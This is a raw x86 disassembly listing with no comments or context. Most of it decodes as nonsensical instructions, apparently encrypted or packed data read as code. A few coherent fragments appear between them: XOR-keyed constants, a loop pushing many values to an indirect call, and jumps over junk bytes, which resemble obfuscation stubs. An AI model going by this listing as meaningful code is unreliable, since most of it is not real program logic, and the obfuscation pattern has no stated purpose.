  40496d:	in     al,dx
  40496e:	in     al,dx
  40496f:	loopne 0x404986
  404971:	or     esp,edi
  404973:	ret    0x4778
  404976:	push   ebx
  404977:	push   ds
  404978:	jne    0x404956
  40497a:	xchg   ebx,eax
  40497b:	out    0x30,eax
  40497d:	repz dec ebp
  40497f:	push   ebp
  404980:	sub    ch,BYTE PTR [ebx+0x78a2882]
  404986:	js     0x404a01
  404988:	jo     0x4049ea
  40498a:	dec    edx
  40498b:	fs or  ah,ah
  40498e:	jmp    0xf38d:0x9e6f8c27
  404995:	jnp    0x404940
  404997:	xor    bl,BYTE PTR [edi+0x6b]
  40499a:	gs jno 0x40498f
  40499d:	jmp    0x43c5f36
  4049a2:	sub    BYTE PTR [esi+ebx*1+0x5d1bf225],bl
  4049a9:	int3   
  4049aa:	stos   DWORD PTR es:[edi],eax
  4049ab:	inc    esp
  4049ac:	xor    ch,BYTE PTR [ebp-0x5eb1f654]
  4049b2:	cmp    ch,bh
  4049b4:	push   esi
  4049b5:	ins    DWORD PTR es:[edi],dx
  4049b6:	inc    eax
  4049b7:	mov    ebx,0xcd7a5662
  4049bc:	adc    ebp,DWORD PTR [esi-0x61e9f398]
  4049c2:	sub    BYTE PTR [eax+0x83e71e],dl
  4049c8:	inc    eax
  4049c9:	mov    cl,0x39
  4049cb:	stos   BYTE PTR es:[edi],al
  4049cc:	out    dx,eax
  4049cd:	fcomp  DWORD PTR [eax]
  4049cf:	int3   
  4049d0:	mov    ah,0xe
  4049d2:	push   0xf42377e5
  4049d7:	mov    esp,0xe011d487
  4049dc:	xchg   edi,eax
  4049dd:	sbb    BYTE PTR [ebx-0x58],al
  4049e0:	push   ds
  4049e1:	add    eax,0x451a8297
  4049e6:	je     0x4049f2
  4049e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049e9:	daa    
  4049ea:	jge    0x4049e4
  4049ec:	mov    ebp,ebx
  4049ee:	pop    eax
  4049ef:	ins    DWORD PTR es:[edi],dx
  4049f0:	mov    ah,0x8c
  4049f2:	mov    cl,0x7f
  4049f4:	and    DWORD PTR [esi+0x3f],0x710bc40a
  4049fb:	fisttp DWORD PTR [ebx+esi*2]
  4049fe:	mov    eax,ss:0x145dd346
  404a04:	or     BYTE PTR [ecx],ah
  404a06:	cmp    ecx,DWORD PTR [esi]
  404a08:	pop    edi
  404a09:	xor    eax,0x346f04db
  404a0e:	lds    ebp,FWORD PTR [ebx]
  404a10:	test   DWORD PTR [ebp+0x78],esp
  404a13:	rcr    dl,0x76
  404a16:	mov    bl,0x3e
  404a18:	jno    0x4049dc
  404a1a:	dec    edi
  404a1b:	lods   al,BYTE PTR ds:[esi]
  404a1c:	in     eax,dx
  404a1d:	in     al,dx
  404a1e:	icebp  
  404a1f:	sub    al,0x68
  404a21:	not    DWORD PTR [ebp+0x15]
  404a24:	repz add edx,DWORD PTR [ecx+0x3b26a27d]
  404a2b:	ins    BYTE PTR es:[edi],dx
  404a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a2d:	jo     0x404a00
  404a2f:	jl     0x4049dd
  404a31:	inc    DWORD PTR [ebp+0xc]
  404a34:	jmp    0x404377
  404a39:	jmp    0x404b7e
  404a3e:	cmp    eax,0xf1133703
  404a43:	xor    ebx,ecx
  404a45:	sar    DWORD PTR [edx+esi*1+0x9],1
  404a49:	cld    
  404a4a:	jns    0x404a3a
  404a4c:	adc    esp,DWORD PTR gs:[ecx+eiz*1]
  404a50:	jo     0x404ac2
  404a52:	sbb    BYTE PTR [edi+0x70],bh
  404a55:	jo     0x404aa7
  404a57:	(bad)  
  404a5a:	jnp    0x404acd
  404a5c:	(bad)  
  404a5d:	push   esp
  404a5e:	jbe    0x404aa2
  404a60:	add    esi,DWORD PTR [edx-0x12]
  404a63:	int    0xe6
  404a65:	pop    ss
  404a66:	inc    edi
  404a67:	mov    dh,0x14
  404a69:	pusha  
  404a6a:	or     dl,BYTE PTR [edi-0x1ef9bdc8]
  404a70:	mov    edx,0x64ec7b16
  404a75:	jns    0x404a8c
  404a77:	stc    
  404a78:	and    dh,BYTE PTR [eax+eax*1]
  404a7b:	mov    esi,DWORD PTR [ebp-0x6a]
  404a7e:	cmp    eax,0x629d9928
  404a83:	aaa    
  404a84:	int    0x4f
  404a86:	mov    ds:0x69d6a3f,eax
  404a8b:	push   esi
  404a8c:	popa   
  404a8d:	fdivr  DWORD PTR [edi]
  404a8f:	sbb    BYTE PTR [eax-0x8fae614],dh
  404a95:	dec    edx
  404a96:	pop    esi
  404a97:	stos   BYTE PTR es:[edi],al
  404a98:	or     al,0xec
  404a9a:	add    BYTE PTR [edi],0x6f
  404a9d:	or     DWORD PTR [edi],edi
  404a9f:	push   cs
  404aa0:	mov    ah,0x95
  404aa2:	or     eax,0x4c5728f4
  404aa7:	xor    esi,DWORD PTR [esi-0x45bb602]
  404aad:	sbb    DWORD PTR [ebp+0xb94bd4],ecx
  404ab3:	imul   ecx,DWORD PTR [ecx],0xffffffe6
  404ab6:	mov    esi,0x9b29f372
  404abb:	loop   0x404a8f
  404abd:	neg    DWORD PTR [ebp+0x668d6564]
  404ac3:	pop    eax
  404ac4:	adc    ebx,esi
  404ac6:	popa   
  404ac7:	aas    
  404ac8:	mov    dl,0x93
  404aca:	jmp    0x404ad9
  404acc:	push   ds
  404acd:	inc    eax
  404ace:	mov    ah,0x58
  404ad0:	pop    edi
  404ad1:	xor    eax,0xde7bd3d1
  404ad6:	mov    al,ds:0x9633aebc
  404adb:	and    al,0xbf
  404add:	inc    edx
  404ade:	dec    ebp
  404adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ae0:	inc    edi
  404ae1:	xchg   dl,dl
  404ae3:	test   DWORD PTR cs:[ecx-0x21305d42],edx
  404aea:	repnz fcom st(6)
  404aed:	push   es
  404aee:	adc    edi,edx
  404af0:	fidivr WORD PTR [edx-0x2d8b9f7f]
  404af6:	ds test eax,0x45590975
  404afc:	xor    BYTE PTR [ebx+0x20272ecc],ch
  404b02:	cmp    BYTE PTR [edi],bh
  404b04:	pushf  
  404b05:	pop    esi
  404b06:	add    eax,0xa4c1dd96
  404b0b:	ds sbb edx,ebx
  404b0e:	in     eax,0x20
  404b10:	mov    eax,ds:0x90641ea9
  404b15:	js     0x404b8c
  404b17:	es push ebp
  404b19:	sub    dh,bl
  404b1b:	pushf  
  404b1c:	add    DWORD PTR [esi],ebp
  404b1e:	add    eax,0x28d9e309
  404b23:	pop    es
  404b24:	mov    al,gs:0xdff5f85f
  404b2a:	cmp    BYTE PTR [ecx],0x89
  404b2d:	scas   eax,DWORD PTR es:[edi]
  404b2e:	stos   BYTE PTR es:[edi],al
  404b2f:	(bad)  
  404b30:	jecxz  0x404b5f
  404b32:	push   0x6f
  404b34:	mov    ecx,0x6c604409
  404b39:	sbb    edx,ecx
  404b3b:	ret    
  404b3c:	pop    ds
  404b3d:	push   eax
  404b3e:	xchg   dh,bl
  404b40:	rcl    BYTE PTR [ebx+0x11],1
  404b43:	pop    ds
  404b44:	mov    esi,eax
  404b46:	jmp    0x3055b683
  404b4b:	fsubr  st,st(7)
  404b4d:	addr16 jmp 0x7abf:0xe5aa7d34
  404b55:	out    0x86,eax
  404b57:	adc    BYTE PTR [ebp+esi*1+0x43],al
  404b5b:	test   eax,0xf45bab21
  404b60:	mov    dl,0xd4
  404b62:	aas    
  404b63:	das    
  404b64:	leave  
  404b65:	xor    DWORD PTR [eax],esp
  404b67:	jmp    0x9b5e:0x955ef40
  404b6e:	jne    0x404bb4
  404b70:	mov    bh,0x89
  404b72:	or     DWORD PTR [edx+0x4d8833e1],ebx
  404b78:	pop    ss
  404b79:	mov    ebp,0x4ef9f63f
  404b7e:	mov    eax,DWORD PTR [ebp-0x10]
  404b81:	xor    eax,ecx
  404b83:	mov    ecx,DWORD PTR [ebp+0x10]
  404b86:	add    eax,esi
  404b88:	jmp    0x404ccd
  404b8d:	pop    esi
  404b8e:	adc    BYTE PTR [esi-0x8],bh
  404b91:	mov    esi,0x9ce666a6
  404b96:	es icebp 
  404b98:	xor    eax,0x6a2771e3
  404b9d:	int3   
  404b9e:	and    BYTE PTR [eax+0x70],dh
  404ba1:	sbb    BYTE PTR [edi+0x70],bh
  404ba4:	jo     0x404b66
  404ba6:	xchg   ebp,eax
  404ba7:	call   0x2aae04a9
  404bac:	mov    edi,0xdbb972e4
  404bb1:	inc    eax
  404bb2:	fadd   st(2),st
  404bb4:	sbb    ch,BYTE PTR [eax+ecx*2]
  404bb7:	jns    0x404c15
  404bb9:	daa    
  404bba:	sbb    al,0x1e
  404bbc:	loopne 0x404bff
  404bbe:	fadd   st,st(2)
  404bc0:	es das 
  404bc2:	jp     0x404c01
  404bc4:	ret    0xb8aa
  404bc7:	fs inc eax
  404bc9:	ret    
  404bca:	sub    ebp,DWORD PTR [ebp+0x20]
  404bcd:	aam    0x9b
  404bcf:	jmp    0x404bf6
  404bd1:	pop    esi
  404bd2:	inc    ebp
  404bd3:	hlt    
  404bd4:	call   0xe778:0x83a6f38
  404bdb:	aad    0x5c
  404bdd:	ins    BYTE PTR es:[edi],dx
  404bde:	or     dh,BYTE PTR [edx+esi*4-0x29]
  404be2:	dec    esp
  404be3:	shl    DWORD PTR ds:0x2d136671,1
  404be9:	inc    esp
  404bea:	xchg   esp,eax
  404beb:	sbb    esi,esi
  404bed:	icebp  
  404bee:	out    dx,eax
  404bef:	mov    WORD PTR [edi],cs
  404bf1:	jb     0x404c30
  404bf3:	aaa    
  404bf4:	test   BYTE PTR [esi-0xb9b7afa],bl
  404bfa:	(bad)  
  404bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bfc:	or     WORD PTR [ecx-0x51],bp
  404c00:	out    dx,eax
  404c01:	(bad)  
  404c02:	mov    WORD PTR [esp+ebp*8+0x31e6b4f8],es
  404c09:	out    0xea,eax
  404c0b:	adc    al,0x75
  404c0d:	lock adc BYTE PTR [edi],0xef
  404c11:	mov    bl,0x66
  404c13:	scas   eax,DWORD PTR es:[edi]
  404c14:	xchg   BYTE PTR [edx+ebx*2-0x5f4b50e6],ch
  404c1b:	cs cwde 
  404c1d:	les    esp,FWORD PTR [eax-0x46772db1]
  404c23:	xchg   edx,eax
  404c24:	xchg   edx,eax
  404c25:	cwde   
  404c26:	mov    ebp,0x57386694
  404c2b:	xchg   ebp,eax
  404c2c:	cmp    al,0x76
  404c2e:	mov    ds:0x324883e8,al
  404c33:	(bad)  [ebp+0x188aa5ef]
  404c39:	mov    ebx,0x5c043f3a
  404c3e:	aad    0x92
  404c40:	adc    al,BYTE PTR ds:0x2cb1b6da
  404c46:	push   ebx
  404c47:	xor    BYTE PTR [edx],ah
  404c49:	imul   ebp,DWORD PTR [esi],0xffffffb8
  404c4c:	nop
  404c4d:	jns    0x404bd8
  404c4f:	call   0xc0f3:0xe15a15e2
  404c56:	enter  0xe780,0x5
  404c5a:	and    dl,BYTE PTR [ebp+0x746d1760]
  404c60:	loop   0x404c0d
  404c62:	aaa    
  404c63:	rcr    DWORD PTR [edi+0x31b20404],cl
  404c69:	xchg   ebp,eax
  404c6a:	daa    
  404c6b:	js     0x404c87
  404c6d:	inc    ecx
  404c6e:	pop    edx
  404c6f:	mov    ah,0x9b
  404c71:	inc    esp
  404c72:	inc    edi
  404c73:	lea    bp,[ecx+0x42]
  404c77:	in     eax,dx
  404c78:	or     DWORD PTR [esi+0x6a2197c1],ebx
  404c7e:	mov    ?,WORD PTR [ecx-0x32dce759]
  404c84:	sub    esp,ecx
  404c86:	mov    eax,ds:0x88e9f6bd
  404c8b:	push   edx
  404c8c:	call   0x2244b5c4
  404c91:	mov    ebx,0xf0ac3895
  404c96:	(bad)  
  404c98:	(bad)  
  404c9a:	xor    ecx,DWORD PTR [eax]
  404c9c:	test   BYTE PTR [ecx+0x41],cl
  404c9f:	add    DWORD PTR [edi],0xd6ca3840
  404ca5:	push   esi
  404ca6:	inc    edx
  404ca7:	xchg   ch,dl
  404ca9:	or     bl,BYTE PTR [edx+0x74]
  404cac:	sub    eax,esi
  404cae:	stos   BYTE PTR es:[edi],al
  404caf:	mov    dl,0xf7
  404cb1:	xchg   esp,eax
  404cb2:	sub    eax,0x4dc078e2
  404cb7:	outs   dx,BYTE PTR ds:[esi]
  404cb8:	inc    al
  404cba:	push   esi
  404cbb:	inc    ebx
  404cbc:	jg     0x404d0a
  404cbe:	push   ss
  404cbf:	cdq    
  404cc0:	call   0x54c15ca3
  404cc5:	or     DWORD PTR [ebx-0x6ecd6c89],edi
  404ccb:	scas   al,BYTE PTR es:[edi]
  404ccc:	adc    ecx,DWORD PTR [ecx-0x3d36a1ff]
  404cd2:	or     al,0x0
  404cd4:	push   ebp
  404cd5:	mov    ebp,esp
  404cd7:	push   ecx
  404cd8:	push   ecx
  404cd9:	sub    DWORD PTR ds:0x432dd6,0x432704
  404ce3:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  404cea:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  404cf1:	and    DWORD PTR ds:0x43437e,0x0
  404cfb:	xor    ecx,ecx
  404cfd:	add    ecx,DWORD PTR ds:0x43437e
  404d03:	inc    ecx
  404d04:	mov    DWORD PTR ds:0x43437e,ecx
  404d0a:	cmp    DWORD PTR ds:0x43437e,0x26
  404d11:	jne    0x404d52
  404d17:	push   DWORD PTR [ebp-0x20]
  404d1a:	push   DWORD PTR [ebp-0x24]
  404d1d:	push   0x434382
  404d22:	push   0x43438e
  404d27:	push   DWORD PTR [ebp-0x28]
  404d2a:	push   0x6ce4
  404d2f:	push   0x479e
  404d34:	push   DWORD PTR [ebp-0xc]
  404d37:	push   DWORD PTR [ebp-0x14]
  404d3a:	push   0x7cf9
  404d3f:	push   0x1b21
  404d44:	push   0x8797
  404d49:	push   DWORD PTR [ebp-0x24]
  404d4c:	call   DWORD PTR ds:0x432c32
  404d52:	cmp    DWORD PTR ds:0x43437e,0x1a
  404d59:	jb     0x404cfb
  404d5f:	neg    edx
  404d61:	mov    eax,DWORD PTR [ebp-0x4]
  404d64:	push   esi
  404d65:	xor    ecx,0x4a51
  404d6b:	mov    esi,DWORD PTR [ebp-0x8]
  404d6e:	mov    edx,0x7510855
  404d73:	xor    eax,edx
  404d75:	xor    esi,edx
  404d77:	mov    ecx,0x32729c
  404d7c:	adc    DWORD PTR ds:0x43441d,0x4006
  404d86:	jmp    0x40500a
  404d8b:	popa   
  404d8c:	sahf   
  404d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8e:	mov    fs,WORD PTR [ebx-0x6b]
  404d91:	jno    0x404e04
  404d93:	mov    al,ds:0xd419e646
  404d98:	fiadd  DWORD PTR [eax+0x43]
  404d9b:	hlt    
  404d9c:	das    
  404d9d:	jo     0x404e0f
  404d9f:	fnstcw WORD PTR [esi+0x70]
  404da2:	jo     0x404d53
  404da4:	jg     0x404dc7
  404da6:	xchg   ebp,eax
  404da7:	fstp   TBYTE PTR [ecx]
  404da9:	or     esp,eax
  404dab:	dec    esi
  404dac:	aad    0x5e
  404dae:	(bad)  [eax+0x66b0fd99]
  404db4:	out    dx,eax
  404db5:	sar    eax,1
  404db7:	mov    al,ds:0xda9fb048
  404dbc:	out    dx,al
  404dbd:	dec    ebx
  404dbe:	rcr    DWORD PTR [eax-0x2bb990bc],1
  404dc4:	push   ecx
  404dc5:	cmp    ch,BYTE PTR [ebx+0x2c8be761]
  404dcb:	stos   BYTE PTR es:[edi],al
  404dcc:	shl    BYTE PTR [ebp-0x74],0x4b
  404dd0:	jno    0x404daf
  404dd2:	div    BYTE PTR [eax]
  404dd4:	retf   0xcf02
  404dd7:	adc    BYTE PTR [edi-0x1d3fd77a],ch
  404ddd:	ja     0x404e57
  404ddf:	cmp    ch,BYTE PTR [eax]
  404de1:	out    0x4,eax
  404de3:	cli    
  404de4:	dec    ecx
  404de5:	push   esp
  404de6:	in     eax,0x23
  404de8:	fstp   QWORD PTR [edi-0x40]
  404deb:	arpl   WORD PTR [esi+0x3f],ax
  404dee:	mov    ds:0x6c70444e,eax
  404df3:	fdivr  QWORD PTR [ecx-0x9]
  404df6:	pop    ecx
  404df7:	cmp    al,0xff
  404df9:	popa   
  404dfa:	jne    0x404e59
  404dfc:	shl    DWORD PTR [eax+0x5d],0x45
  404e00:	dec    esi
  404e01:	cs cmc 
  404e03:	sub    BYTE PTR [edi+0x43e34466],0xd
  404e0a:	cli    
  404e0b:	aaa    
  404e0c:	data16 xor bl,BYTE PTR [ecx+eax*8]
  404e10:	jnp    0x404e2a
  404e12:	dec    ebx
  404e13:	jno    0x404e60
  404e15:	rol    BYTE PTR [esi+0x22],cl
  404e18:	sbb    eax,0x62cbfb98
  404e1d:	into   
  404e1e:	lds    eax,FWORD PTR [ebp-0x23]
  404e21:	pop    esi
  404e22:	xor    al,0x53
  404e24:	inc    esi
  404e25:	sub    ebx,esi
  404e27:	xchg   edx,eax
  404e28:	add    DWORD PTR [ebx-0x5f],0xc12f98a1
  404e2f:	dec    ebx
  404e30:	out    dx,eax
  404e31:	push   0xd5377859
  404e36:	cmp    bh,dl
  404e38:	std    
  404e39:	cmp    DWORD PTR [ebx+0x463f61dd],eax
  404e3f:	xchg   ecx,eax
  404e40:	xchg   esi,eax
  404e41:	and    al,0xa4
  404e43:	dec    edi
  404e44:	pushf  
  404e45:	xor    edx,edx
  404e47:	inc    esi
  404e48:	mov    dl,0x19
  404e4a:	pusha  
  404e4b:	sbb    esi,DWORD PTR [esi+ebp*8+0x65]
  404e4f:	daa    
  404e50:	fdivr  st(0),st
  404e52:	mov    al,0xe3
  404e54:	cmp    al,bh
  404e56:	cmp    DWORD PTR [edx-0x99e455c],0xfc1dad09
  404e60:	push   edx
  404e61:	clc    
  404e62:	mov    ecx,0xd2b8cda9
  404e67:	(bad)  
  404e68:	fistp  WORD PTR [eax-0x3d]
  404e6b:	inc    ecx
  404e6c:	rcl    al,cl
  404e6e:	xchg   ebx,eax
  404e6f:	sti    
  404e70:	(bad)  
  404e71:	mov    al,ds:0xd91e563f
  404e76:	mul    BYTE PTR [ecx-0x30c9a425]
  404e7c:	cdq    
  404e7d:	inc    edi
  404e7e:	and    al,0xb9
  404e80:	mov    esp,0xfb06ba2a
  404e85:	add    al,BYTE PTR [ecx-0x108484db]
  404e8b:	test   eax,0xda787e3b
  404e90:	push   cs
  404e91:	sub    esp,ebx
  404e93:	das    
  404e94:	xchg   ecx,eax
  404e95:	jp     0x404e2b
  404e97:	cli    
  404e98:	enter  0xae2a,0xc1
  404e9c:	lahf   
  404e9d:	sti    
  404e9e:	fiadd  DWORD PTR [edx-0x1cc79b73]
  404ea4:	pop    esi
  404ea5:	imul   edi,DWORD PTR [edx-0x248cba27],0x14804cc0
  404eaf:	mov    ebx,fs
  404eb1:	(bad)  [ebp-0x17082edd]
  404eb7:	jno    0x404e3f
  404eb9:	sbb    esp,eax
  404ebb:	(bad)  
  404ebd:	cmp    ebp,ebx
  404ebf:	fucomip st,st(2)
  404ec1:	bswap  ecx
  404ec3:	sahf   
  404ec4:	push   0xa0a9a4f1
  404ec9:	dec    ebp
  404eca:	or     ebp,0xffffffbc
  404ecd:	pusha  
  404ece:	rcl    BYTE PTR [ebp+0x1ae815f7],1
  404ed4:	stc    
  404ed5:	scas   al,BYTE PTR es:[edi]
  404ed6:	xchg   DWORD PTR [eax-0x1476e67f],ebp
  404edc:	sbb    eax,DWORD PTR [ecx]
  404ede:	xor    ebx,DWORD PTR [ebp+0x324b086]
  404ee4:	loop   0x404eb0
  404ee6:	arpl   di,di
  404ee8:	mov    ebp,DWORD PTR [edi+0x53bda5a4]
  404eee:	pop    ds
  404eef:	(bad)  
  404ef0:	sar    dl,1
  404ef2:	pusha  
  404ef3:	out    0xf1,al
  404ef5:	mov    bl,0x36
  404ef7:	and    eax,edx
  404ef9:	mov    ds:0xe64ad34d,eax
  404efe:	enter  0x7c56,0xb7
  404f02:	leave  
  404f03:	loopne 0x404e93
  404f05:	in     al,0x9e
  404f07:	aad    0x58
  404f09:	into   
  404f0a:	push   ebp
  404f0b:	(bad)  
  404f0d:	fld    DWORD PTR [edx-0x7c]
  404f10:	mov    al,0xdc
  404f12:	xor    BYTE PTR [eax+0x2c],0x22
  404f16:	push   eax
  404f17:	clc    
  404f18:	xor    ecx,DWORD PTR [ecx+0x41]
  404f1b:	xlat   BYTE PTR ds:[ebx]
  404f1c:	mov    al,0x65
  404f1e:	xchg   edx,eax
  404f1f:	mov    ds:0x6172e3ef,al
  404f24:	jns    0x404ec0
  404f26:	jl     0x404f8b
  404f28:	repnz add dl,BYTE PTR [ebx+0x2fcaddfa]
  404f2f:	jne    0x404eb1
  404f31:	iret   
  404f32:	out    dx,eax
  404f33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f34:	pop    eax
  404f35:	stos   BYTE PTR es:[edi],al
  404f36:	test   DWORD PTR [ebx+0x2f],0xee6eb4cb
  404f3d:	or     esi,DWORD PTR [ecx-0xb236436]
  404f43:	pop    eax
  404f45:	mov    ebx,0xf43a1548
  404f4a:	pop    esi
  404f4b:	sbb    DWORD PTR [esi],eax
  404f4d:	fsubp  st(4),st
  404f4f:	stos   BYTE PTR es:[edi],al
  404f50:	jne    0x404ee6
  404f52:	in     al,dx
  404f53:	mov    edx,0xdd00733f
  404f58:	cmp    al,0x5f
  404f5a:	adc    al,0x18
  404f5c:	xchg   ecx,eax
  404f5d:	clc    
  404f5e:	dec    eax
  404f5f:	xor    DWORD PTR [edi+0x34],edi
  404f62:	sub    al,0x52
  404f64:	mov    ?,WORD PTR [edx+eax*8]
  404f67:	sbb    al,0xbe
  404f69:	xchg   ebp,eax
  404f6a:	push   0x57084347
  404f6f:	jmp    0x404f07
  404f71:	enter  0x25f3,0x84
  404f75:	fist   DWORD PTR [edx-0x24]
  404f78:	cmp    BYTE PTR [edx],ah
  404f7a:	and    al,0x72
  404f7c:	jmp    0x1c6ee09f
  404f81:	mov    esp,0x24ddd37c
  404f86:	stc    
  404f87:	or     al,0xfc
  404f89:	sahf   
  404f8a:	and    BYTE PTR [ecx-0x7e1e0bf9],al
  404f90:	div    ebp
  404f92:	call   0x1a5c431f
  404f97:	add    esp,edx
  404f99:	cmp    DWORD PTR [esi-0x2a82d1d4],ecx
  404f9f:	jne    0x40500f
  404fa1:	sub    cl,ah
  404fa3:	jmp    0xcdbf:0x6927ed6f
  404faa:	xor    al,BYTE PTR ds:0xff0a4c62
  404fb0:	xchg   esp,eax
  404fb1:	movups XMMWORD PTR [eax],xmm2
  404fb4:	mov    bl,0xf5
  404fb6:	dec    edi
  404fb7:	iret   
  404fb8:	out    dx,eax
  404fb9:	aam    0xee
  404fbb:	push   ss
  404fbc:	xchg   ecx,eax
  404fbd:	dec    edx
  404fbe:	sub    DWORD PTR [eax+0x520a644b],ebx
  404fc4:	cs scas al,BYTE PTR es:[edi]
  404fc6:	and    al,BYTE PTR [eax]
  404fc8:	cmp    al,0xbd
  404fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fcb:	mov    WORD PTR [edx],cs
  404fcd:	mov    WORD PTR ds:0x329723b7,cs
  404fd3:	into   
  404fd4:	push   ds
  404fd5:	or     DWORD PTR [ebp-0x36],0xffffffaa
  404fd9:	dec    esp
  404fda:	call   0x7243:0x2d9faa53
  404fe1:	mov    eax,ds:0x2bb2d61c
  404fe6:	pop    ebp
  404fe7:	sahf   
  404fe8:	outs   dx,BYTE PTR ds:[esi]
  404fe9:	sbb    BYTE PTR [ebx],cl
  404feb:	dec    ebp
  404fec:	pop    esi
  404fed:	jecxz  0x404f9a
  404fef:	ss jnp 0x404fb2
  404ff2:	xchg   edi,eax
  404ff3:	test   eax,0x7981232
  404ff8:	pop    ecx
  404ff9:	aaa    
  404ffa:	mov    edi,fs
  404ffc:	stos   DWORD PTR es:[edi],eax
  404ffd:	ret    
  404ffe:	aas    
  404fff:	stos   DWORD PTR es:[edi],eax
  405000:	enter  0x6901,0x1a
  405004:	(bad)  
  405005:	cmp    dh,BYTE PTR [eax+0x39e6659]
  40500b:	icebp  
  40500c:	xor    DWORD PTR ds:0x434396,0x260
  405016:	add    eax,ecx
  405018:	imul   eax,esi
  40501b:	mov    DWORD PTR ds:0x43438a,0x336a
  405025:	mov    esi,DWORD PTR [ebp+0xc]
  405028:	mov    DWORD PTR ds:0x434396,0x44f4
  405032:	cmp    esi,eax
  405034:	mov    DWORD PTR ds:0x432dca,0x3ddd
  40503e:	jne    0x4052de
  405044:	mov    eax,DWORD PTR [ebp-0x4]
  405047:	mov    esi,DWORD PTR [ebp-0x8]
  40504a:	xor    eax,edx
  40504c:	jmp    0x4052d0
  405051:	test   DWORD PTR [ebp+0xb],ebx
  405054:	cmp    al,0xf3
  405056:	push   0x55
  405058:	popa   
  405059:	and    DWORD PTR [esi],0x2f
  40505c:	adc    al,0xdd
  40505e:	mov    esi,0x2d5d5f4f
  405063:	jo     0x4050d5
  405065:	fnstcw WORD PTR [esi+0x70]
  405068:	jo     0x4050a5
  40506a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40506c:	cdq    
  40506d:	push   ecx
  40506e:	or     edx,edi
  405070:	stos   BYTE PTR es:[edi],al
  405071:	push   ss
  405072:	sbb    eax,0x416b9374
  405077:	cmp    BYTE PTR [edi-0xb196b3f],ah
  40507d:	or     BYTE PTR [ebx+ecx*2-0x29],0x55
  405082:	xchg   ecx,eax
  405083:	jge    0x405041
  405085:	lods   al,BYTE PTR ds:[esi]
  405086:	xor    al,0x58
  405088:	dec    edx
  405089:	dec    esp
  40508a:	push   esp
  40508b:	inc    esp
  40508c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40508d:	jecxz  0x405066
  40508f:	(bad)  
  405090:	fstp   DWORD PTR [eax-0x6]
  405093:	or     eax,DWORD PTR [ebp+0x56]
  405096:	push   esp
  405097:	mov    ds:0x7046ee36,eax
  40509c:	mov    bl,0x50
  40509e:	xchg   DWORD PTR [ecx+0x6443701e],ecx
  4050a4:	jo     0x4050be
  4050a6:	xlat   BYTE PTR ds:[ebx]
  4050a7:	or     BYTE PTR [ebp+0x3f2e9e23],0xc0
  4050ae:	dec    edi
  4050af:	fnsave [ecx+0x5ab8d92d]
  4050b5:	lea    eax,[ebp-0x7c]
  4050b8:	or     ah,BYTE PTR [eax-0x1d]
  4050bb:	cmp    al,0xaa
  4050bd:	fs fld st(7)
  4050c0:	cmp    al,0x4c
  4050c2:	and    edi,esp
  4050c4:	cmp    al,0x5d
  4050c6:	xor    al,BYTE PTR [ebx]
  4050c8:	hlt    
  4050c9:	fdiv   DWORD PTR ds:0x660833c3
  4050cf:	xchg   BYTE PTR [ecx-0x13e3034c],bh
  4050d5:	push   ebx
  4050d6:	mov    al,ds:0x1762fea1
  4050db:	cmp    BYTE PTR [edi],dh
  4050dd:	pop    esp
  4050de:	push   esp
  4050df:	sbb    edi,esp
  4050e1:	in     al,0x9c
  4050e3:	cli    
  4050e4:	leave  
  4050e5:	xchg   ebp,eax
  4050e6:	pusha  
  4050e7:	or     ebx,DWORD PTR [eax-0x3dc7057f]
  4050ed:	jmp    0x40514c
  4050ef:	xchg   ebx,eax
  4050f0:	push   ebx
  4050f1:	mov    ebp,0x32846865
  4050f6:	xor    al,BYTE PTR [eax]
  4050f8:	mov    ah,0xf3
  4050fa:	push   ebx
  4050fb:	sbb    al,0x9b
  4050fd:	push   ss
  4050fe:	add    al,0x47
  405100:	(bad)  
  405101:	cmc    
  405102:	mov    ds:0x50f148a2,eax
  405107:	outs   dx,DWORD PTR ss:[si]
  40510a:	jmp    0x4050af
  40510c:	(bad)  
  40510d:	sbb    cl,dl
  40510f:	test   DWORD PTR [ecx+edi*2],ebx
  405112:	scas   al,BYTE PTR es:[edi]
  405113:	cmp    dl,BYTE PTR [ecx]
  405115:	cmp    edi,ecx
  405117:	mov    esi,0xa5c4582a
  40511c:	test   DWORD PTR [ebx-0x1553dfa7],ebp
  405122:	das    
  405123:	add    cl,dl
  405125:	jmp    0x4857e5b
  40512a:	inc    ebp
  40512b:	adc    edx,DWORD PTR [edx]
  40512d:	lods   eax,DWORD PTR ds:[esi]
  40512e:	xchg   ebx,eax
  40512f:	js     0x4050cf
  405131:	enter  0x4a24,0xbc
  405135:	push   es
  405136:	outs   dx,BYTE PTR ds:[esi]
  405137:	jmp    0x4050da
  405139:	loopne 0x40516f
  40513b:	imul   ecx,DWORD PTR [ebx-0x431519c2],0xfffffff5
  405142:	push   0x6
  405144:	rcr    BYTE PTR [eax+0x4c],1
  405147:	(bad)  
  405148:	jl     0x405145
  40514a:	push   0x32
  40514c:	popf   
  40514d:	sbb    cl,BYTE PTR [eax+0x35]
  405150:	inc    eax
  405151:	xchg   esp,esi
  405153:	aas    
  405154:	cmp    eax,DWORD PTR [edx-0x31]
  405157:	shr    BYTE PTR [edx+edx*2+0x14],1
  40515b:	test   BYTE PTR [edi+0x1a70dd3d],bh
  405161:	repz aad 0xb1
  405164:	push   esi
  405165:	and    al,0x96
  405167:	jg     0x4051df
  405169:	mov    ebp,0x55891137
  40516e:	(bad)  
  40516f:	fsubr  st(0),st
  405171:	dec    ebx
  405172:	adc    eax,0x3b8b9b98
  405177:	dec    BYTE PTR [esi]
  405179:	mov    esp,0x8f89a487
  40517e:	pop    es
  40517f:	mov    BYTE PTR [ecx+ecx*4],ah
  405182:	push   edx
  405183:	lds    edi,FWORD PTR [ebp+0x31df0eed]
  405189:	aaa    
  40518a:	leave  
  40518b:	push   cs
  40518c:	sahf   
  40518d:	popa   
  40518e:	ins    DWORD PTR es:[edi],dx
  40518f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
